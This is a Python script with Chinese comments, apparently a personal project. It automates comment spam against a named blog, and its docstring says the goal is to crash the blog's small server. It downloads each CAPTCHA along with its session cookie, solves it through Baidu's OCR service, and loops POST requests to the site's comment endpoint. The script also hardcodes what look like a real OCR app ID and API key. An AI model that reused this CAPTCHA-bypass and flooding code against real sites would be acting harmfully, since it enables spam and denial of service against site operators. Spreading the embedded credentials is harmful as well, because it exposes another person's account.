#! usr/bin/env python
# -*- coding: utf-8 -*-
# Author: zhang xiong
# Time: 2018/3/18

'''
这是一个博客批量评论脚本，博客服务器配置为1C1G1M，可否通过本脚本试图批量注入评论，达到down机目的？是否可行，拭目以待……
试验地址：http://www.66super.com/blog/articles/116.html
数据库类型：MySQL
核心技术：验证码识别和post提交(验证码带cookie)
'''

import requests
#需要安装百度的aip， pip install baidu-aip，如果安装了aip，可能会导致冲突，可以先卸载（pip uninstall aip）
from aip import AipOcr
import os

#浏览器开发者工具经过错误提交可得到验证码地址：http://www.66super.com/image.jsp

#利用requests模块下载验证码
def get_iden_image(filename):
    req = requests.get("http://www.66super.com/image.jsp")
    cookies = req.cookies.get_dict()['JSESSIONID']
    image_path = "images/%s.jpg" % filename
    with open(image_path, "wb+") as image:
        image.write(req.content)    #保存的验证码图片可用于其他项目的机器学习
    print("cookie为：%s" % cookies)
    return (image_path, cookies)

#对接百度ocr文本识别接口（https://console.bce.baidu.com/ai/?_=1521334715174&fromai=1#/ai/speech/app/detail~appId=294999）
def crack_image(image_path):
    APP_ID = '10944894'
    API_KEY = 'cTfuuMiBI3KZG8X4E4t1iTKY'
    SECRET_KEY = ''
    # 初始化AipFace对象
    aipOcr = AipOcr(APP_ID, API_KEY, SECRET_KEY)
    # 读取图片
    with open(image_path, 'rb') as fp:
        content = fp.read()
    # 调用通用文字识别接口
    result = aipOcr.basicGeneral(content)
    if result['words_result'][0]['words']:
        final_result = result['words_result'][0]['words']
        print("验证码为：%s" % final_result)
        return final_result

# 将图片改名，识别后的结果作为文件名
def pass_image(image_path, final_result):
    os.rename(image_path, os.path.dirname(image_path) + r"/pass_images/%s.jpg" % final_result)

# 评论，注意验证码需要戴上cookie
def comment(final_result, cookies1):

    headers = {
        "Accept": "application / json, text / javascript, * / *",
        "Accept - Encoding": "gzip, deflate",
        "Accept - Language": "zh - CN, zh;q = 0.9",
        "Connection": "keep - alive",
        "Content - Length": "37",
        "Content - Type": "application / x - www - form - urlencoded",
        "Cookie": "Hm_lvt_76d4f677a8da6ba52638bbfebaa150c7 = 1520698213; bdshare_firstime = 1521344530047; JSESSIONID = %s; Hm_lpvt_76d4f677a8da6ba52638bbfebaa150c7 = 1521347946" % cookies1,
        "Host": "www.66super.com",
        "Origin": "http://www.66super.com",
        "Referer": "http://www.66super.com/blog/articles/116.html",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    data = {
        "content": "thank you for your sharing, you will get some good commets",
        "imageCode": final_result,
        "blog.id": "116",
    }

    response = requests.post(url="http://www.66super.com/comment/save.do", data=data, headers=headers)
    print(response.text)
    print(type(response.text))  #返回是str
    return response.text


if __name__ == '__main__':
    # 设置计数器
    n_success = 0
    n_failure = 0
    for filename in range(35):  #百度通用文本识别接口最多每天500次，先将验证码图片下载保存
        image_path, cookies = get_iden_image(filename)
        final_result = crack_image(image_path=image_path)
        if final_result:
            msg = comment(final_result, cookies)
            # 所有过程做完之后，把评论成功的验证码图片以识别码作为文件名另存为pass_images文件夹下面，用于后期其他项目的机器学习训练
            if "errorInfo" in msg:
                n_failure += 1
                print("————————评论失败————————")
            else:
                pass_image(image_path, final_result)
                n_success += 1
            print("*" * 50)
            print('截止目前，评论成功%s条，失败%s条' % (n_success, n_failure))
            print("*" * 50)

        else:
            print("error")



